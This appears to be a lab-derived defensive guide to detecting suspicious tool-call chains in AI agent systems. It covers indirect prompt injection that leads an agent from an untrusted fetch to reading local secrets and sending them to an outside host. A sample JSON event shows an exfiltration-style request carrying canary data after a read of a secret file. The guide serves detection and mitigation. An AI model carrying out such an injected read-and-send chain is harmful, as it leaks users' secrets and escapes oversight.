# Tool-Chain Detection Examples

**Status:** lab-derived, disclosure-green
**Scope:** Agent systems that log tool calls, tool outputs, and outbound network requests.

## Suspicious Chains

| Pattern | Detection idea | Why it matters |
|---|---|---|
| Untrusted fetch -> local file read -> external fetch | Alert when a document fetched from an untrusted URL is followed by a read from user-home, workspace secrets, or config paths, then an outbound request to a non-allowlisted host. | Matches the strict-bypass shape in the MCP substrate lab. |
| Tool call sourced from fetched content | Track provenance for assistant tool calls; alert when the nearest causal text span is tool output rather than user intent or trusted system policy. | Separates normal user-driven tool use from indirect prompt injection. |
| Canary-like outbound data | Add synthetic canaries to sensitive test files and alert if they appear in URLs, headers, or request bodies. | Gives fast evidence of exfiltration in staging and test harnesses. |
| Inline tool syntax in assistant text | Alert when assistant content contains executable-looking tags such as `<file_read>` or `<lab_fetch>` in clients that parse text for tool calls. | Inline parser substrates make assistant text part of the security boundary. |

## Example Event Fields

```json
{
  "trace_id": "trace-123",
  "tool": "lab_fetch",
  "tool_input": {"url": "http://127.0.0.1:9002/exfil?data=CANARY-EXAMPLE"},
  "source_provenance": "untrusted_tool_output",
  "preceded_by": ["web_fetch:http://127.0.0.1:9001/attack", "file_read:~/.lab/secret.txt"],
  "decision": "block_and_escalate"
}
```

## Triage Priority

- **High:** local sensitive read followed by external request containing file-derived content.
- **Medium:** local sensitive read after untrusted fetch, even without confirmed outbound data.
- **Low:** inline tool syntax appears in untrusted content but no tool call is executed.

## Durable Mitigations

Prefer structured tool-call events, preserve provenance through the tool layer, require allowlisted outbound hosts for agent-initiated requests, and add confirmation for sensitive file reads or cross-boundary sends.
